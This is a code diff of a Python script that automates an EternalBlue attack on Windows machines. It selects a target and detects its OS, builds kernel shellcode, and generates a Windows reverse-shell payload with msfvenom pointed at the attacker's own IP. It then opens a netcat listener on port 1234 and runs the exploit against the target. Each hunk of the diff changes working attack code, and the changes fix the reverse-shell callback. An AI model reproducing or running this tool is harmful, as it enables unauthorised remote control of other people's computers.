@@ -70,10 +70,11 @@ def chooseTarget(vulnList):
 	
 
 def execVuln(target):
-	shellPrep(target)
+	shellPrep()
 	os = getOS(target)
 	script = ""
 	shellcode = ""
+	clearAndTitle()
 	
 	if os in ["Microsoft Windows 2012", "Microsoft Windows 2016", "Microsoft Windows 10", "Microsoft Windows 8", "Microsoft Windows 8.1"]:
 		sp.run(["sudo", "chmod", "+x", "eternalblue_exploit10.py"])
@@ -84,8 +85,9 @@ def execVuln(target):
 	else:
 		print("Error, os not in list")
 		exit()
-
-	print("Please insert the target os architecture? [64/32]bit")
+	
+	clearAndTitle()
+	print("Please insert the target os architecture? " + os + " [64/32]bit")
 	y = input()
 	if y in ["64", "64bit", "64Bit", "64BIT", "64 bit", "64 Bit", "64 BIT", ""]:
 		shellcode = "shellcode/sc_x64.bin"
@@ -94,15 +96,19 @@ def execVuln(target):
 	else:
 		print("Please insert a valid option")
 		exit()
-
+	
+	clearAndTitle()
 	print("Everything ready, would you like to execute the attack? [Y/n]")
 	y = input()
 	if y not in ["y", "Y", ""]:
 		print("Goodbye!")
 		exit()
-
-	sp.run(["gnome-terminal", "--", "nc", "-nvlp", "1234"])
-	sp.run(["python", script, target, shellcode])
+	
+	clearAndTitle()
+	#sp.Popen(["xfce4-terminal", "-x", "nc", "-nvlp", "1234"])
+	sp.Popen(["gnome-terminal", "--", "nc", "-nvlp", "1234"])
+	sp.call(["sleep", "2"])
+	sp.call(["python", script, target, shellcode])
 
 
 
@@ -125,9 +131,8 @@ def getOS(ip):
 			return res
 
 
-
-def shellPrep(targetIp):
-	targetIp="LHOST=" + targetIp
+def shellPrep():
+	myIp="LHOST=" + getIP()
 	portx64="LPORT=1234"
 	portx86="LPORT=1234"
 
@@ -137,9 +142,9 @@ def shellPrep(targetIp):
 	sp.run(["nasm", "-f", "bin", "shellcode/eternalblue_kshellcode_x86.asm", "-o", "shellcode/sc_x86_kernel.bin"])
 
 	#print("Generating x64 cmd shell...")
-	sp.run(["msfvenom", "-p", "windows/x64/shell_reverse_tcp", "-f", "raw", "-o", "shellcode/sc_x64_msf.bin", "EXITFUNC=thread", targetIp, portx64])
+	sp.run(["msfvenom", "-p", "windows/x64/shell_reverse_tcp", "-f", "raw", "-o", "shellcode/sc_x64_msf.bin", "EXITFUNC=thread", myIp, portx64])
 	#print("Generating x86 cmd shell...")
-	sp.run(["msfvenom", "-p", "windows/x64/shell_reverse_tcp", "-f", "raw", "-o", "shellcode/sc_x86_msf.bin", "EXITFUNC=thread", targetIp, portx86])
+	sp.run(["msfvenom", "-p", "windows/shell_reverse_tcp", "-f", "raw", "-o", "shellcode/sc_x86_msf.bin", "EXITFUNC=thread", myIp, portx86])
 
 	#print("Merging shellcode...")
 	sp.run(["cat", "shellcode/sc_x64_kernel.bin", "shellcode/sc_x64_msf.bin", ">", "shellcode/sc_x64.bin"])
